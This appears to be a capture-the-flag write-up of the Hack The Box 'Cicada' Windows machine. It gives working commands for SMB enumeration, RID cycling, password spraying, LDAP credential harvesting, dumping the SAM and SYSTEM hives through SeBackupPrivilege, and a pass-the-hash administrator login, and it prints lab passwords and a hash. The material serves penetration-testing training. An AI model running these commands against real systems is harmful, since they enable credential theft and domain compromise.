---
icon: windows
---

# Cicada - Easy

<figure><img src="../../.gitbook/assets/image (1016).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/cicada"><strong>Cicada</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 10.10.11.35 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-01 07:58 EDT
Nmap scan report for cicada.htb (10.10.11.35)
Host is up (0.050s latency).
Not shown: 65522 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-01 19:00:18Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2025-10-01T19:01:52+00:00; +7h00m03s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2025-10-01T19:01:52+00:00; +7h00m03s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-01T19:01:52+00:00; +7h00m03s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-01T19:01:52+00:00; +7h00m03s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
60826/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m02s
| smb2-time: 
|   date: 2025-10-01T19:01:15
|_  start_date: N/A

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   64.22 ms 10.10.16.1
2   64.52 ms cicada.htb (10.10.11.35)
```

The nmap scan shows the domain names of cicada.htb & cicada-dc.cicada.htb. I'll add them to my /etc/hosts/ file

```
10.10.11.35	cicada.htb cicada-dc.cicada.htb
```

### <mark style="color:$primary;">SMB Anonymous Access</mark>

```
netexec smb cicada.htb -u guest -p '' --shares
```

<figure><img src="../../.gitbook/assets/image (1000).png" alt=""><figcaption></figcaption></figure>

While Enumerating SMB I noticed I had read access to the HR share. I am going to take a look at it

<figure><img src="../../.gitbook/assets/image (1001).png" alt=""><figcaption></figcaption></figure>

There is a notice text file I am going to download it and check it out.

<figure><img src="../../.gitbook/assets/image (1002).png" alt=""><figcaption></figcaption></figure>

The text document leaks a password! I am going to perform RID-Cycling to grab usernames and then perform credentials spraying on all of them with this password

### <mark style="color:$primary;">RID Cycling</mark>

```
netexec smb cicada.htb -u guest -p '' --rid-brute | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users
```

<figure><img src="../../.gitbook/assets/image (1003).png" alt=""><figcaption></figcaption></figure>

Now to see if any of theses users forgot to change their default password

### <mark style="color:$primary;">Credential Spraying</mark>

```
netexec smb cicada.htb -u users -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

<figure><img src="../../.gitbook/assets/image (1004).png" alt=""><figcaption></figcaption></figure>

```
michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```

Michael forgot to change his default password!&#x20;

### <mark style="color:$primary;">Ldap Enumeration</mark>

While doing ldap enumeration I came across another user's password!

```
netexec ldap cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

<figure><img src="../../.gitbook/assets/image (1005).png" alt=""><figcaption></figcaption></figure>

```
david.orelious:aRt$Lp#7t*VQ!3
```

Okay, let's see what this user has access to

<figure><img src="../../.gitbook/assets/image (1006).png" alt=""><figcaption></figcaption></figure>

david has access to the DEV share, I am going to take a look at it

### <mark style="color:$primary;">SMB DEV share</mark>

```
smbclient -U 'david.orelious%aRt$Lp#7t*VQ!3' \\\\cicada.htb\\DEV
```

<figure><img src="../../.gitbook/assets/image (1007).png" alt=""><figcaption></figcaption></figure>

There is a script here, I am going to download it and take a look at it!

<figure><img src="../../.gitbook/assets/image (1008).png" alt=""><figcaption></figcaption></figure>

This script reveals another users credentials!

```
emily.oscars:Q!3@Lp#M6b*7t*Vt
```

<figure><img src="../../.gitbook/assets/image (1009).png" alt=""><figcaption></figcaption></figure>

with emily we can get a shell on the target machine!&#x20;

```
evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

<figure><img src="../../.gitbook/assets/image (1010).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (1011).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">SeBackupPrivilege</mark>

Emily has SeBackupPrivilege enabled, I am going to use this to dump the SAM & SYSTEM files.

<pre><code>reg save hklm\sam sam
<strong>reg save hklm\system system
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (1012).png" alt=""><figcaption></figcaption></figure>

I am going to download these files to my machine

<figure><img src="../../.gitbook/assets/image (1013).png" alt=""><figcaption></figcaption></figure>

I will use impacket-secretsdmp to dump the sam hashes

```
impacket-secretsdump -system system -sam sam local
```

<figure><img src="../../.gitbook/assets/image (1014).png" alt=""><figcaption></figcaption></figure>

Now let's pass the administrators hash and see if we can get a shell as him

```
evil-winrm -i cicada.htb -u administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
```

<figure><img src="../../.gitbook/assets/image (1015).png" alt=""><figcaption></figcaption></figure>

We got a shell as Admin!
